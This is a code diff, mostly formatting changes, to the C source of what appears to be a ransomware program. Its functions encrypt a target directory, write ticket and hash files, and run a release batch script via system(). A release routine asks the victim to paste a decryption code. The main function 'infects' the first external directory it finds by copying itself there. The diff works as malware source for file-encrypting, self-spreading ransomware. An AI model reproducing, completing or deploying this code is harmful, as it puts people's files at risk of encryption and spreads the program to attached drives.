@@ -28,17 +28,17 @@ bool runPayload(const char *directory, const char *arg0)
 	}
 	//Write ticket
 	if (!makeTicketFile(keyiv, directory)) {
-		fprintf(stderr, "Error: runPayLoad: makeTicketFile Failed\n");
+		fprintf(stderr,
+			"Error: runPayLoad: makeTicketFile Failed\n");
 		free(keyiv);
 		return 0;
 	}
-	
 	//Make Hash File
-	if(!makeHashFile(keyiv, directory)) {
-		fprintf(stderr, "Error: runPayLoad: makeHashFile failed\n");
+	if (!makeHashFile(keyiv, directory)) {
+		fprintf(stderr,
+			"Error: runPayLoad: makeHashFile failed\n");
 		return 0;
 	}
-	
 	//Encrypt Directory
 	if (!encryptDirectory(keyiv, directory)) {
 		fprintf(stderr, "runPayload: encryptDirectory failed\n");
@@ -99,6 +99,9 @@ bool runPayload(const char *directory, const char *arg0)
 	fwrite(RELEASE_SCRIPT, strlen(RELEASE_SCRIPT), 1, fp);
 	fclose(fp);
 
+	//Run release script
+	system("cd playground & release.bat");
+
 	//Free pointers
 	free(bytes);
 	//free(r_path);
@@ -108,7 +111,7 @@ bool runPayload(const char *directory, const char *arg0)
 
 bool runRelease()
 {
-	system(RELEASE_INTRO_SCRIPT);
+
 	printf
 	    ("To decrypt your files, please paste the release code.\n\n");
 
@@ -125,24 +128,25 @@ bool runRelease()
 		    (SYMMETRIC_KEY_SIZE + SYMMETRIC_IV_SIZE) * 2) {
 			//Decode
 			char *keyiv = b16decode(code);
-			
+
 			//Check integrity
-			success = checkKeyivIntegrity(keyiv,".");
-			if(!success){
-				printf("Note: Wrong key (does not match hash)\n");
+			success = checkKeyivIntegrity(keyiv, ".");
+			if (!success) {
+				printf
+				    ("Note: Wrong key (does not match hash)\n");
 				continue;
 			}
-			
 			//Release
 			success = decryptDirectory(keyiv, ".");
 			if (!success)
-				printf("Note: Unable to decrypt directory\n");
+				printf
+				    ("Note: Unable to decrypt directory\n");
 		} else {
 			printf("Note: Invalid Code\n");
 		}
 
 	}
-	if(success){
+	if (success) {
 		//Delete ticket (signals to shell to delete other files)
 		//Please see RELEASE_SCRIPT in common.h
 		char *t_path =
@@ -150,8 +154,11 @@ bool runRelease()
 		strcpy(t_path, "./" TICKET_FILENAME);
 		remove(t_path);
 		free(t_path);
+		
+		//Congratulate
+		printf("Congratulations! Your files have been successfully decrypted\n");
 	}
-	
+
 	return success;
 }
 
@@ -180,25 +187,25 @@ int main(int argc, char **argv)
 		runRelease();
 	} else {
 		//Check if infection is possible
-		char** paths=getExternalPaths();
-		if(paths[0][0]!='\0'){
+		char **paths = getExternalPaths();
+		if (paths[0][0] != '\0') {
 			printf("Beginning Infection\n");
-			
-			char* path = (char *)malloc(strlen(paths[0]));
+
+			char *path = (char *) malloc(strlen(paths[0]));
 			strcpy(path, paths[0]);
-			
+
 			//Infect a external directory
 			infectDirectory(path, argv[0]);
 			free(path);
-			
-		}else{
+
+		} else {
 			printf("Note: No external directories\n");
 		}
 		free(paths);
 
 		//Payload
 		if (fopen("./playground/" TICKET_FILENAME, "r") == NULL) {
-			printf("runPayload: %s\n",
+			printf("OSIR Status: %s\n",
 			       runPayload("playground",
 					  argv[0]) ? "OK" : "Failed");
 		} else {
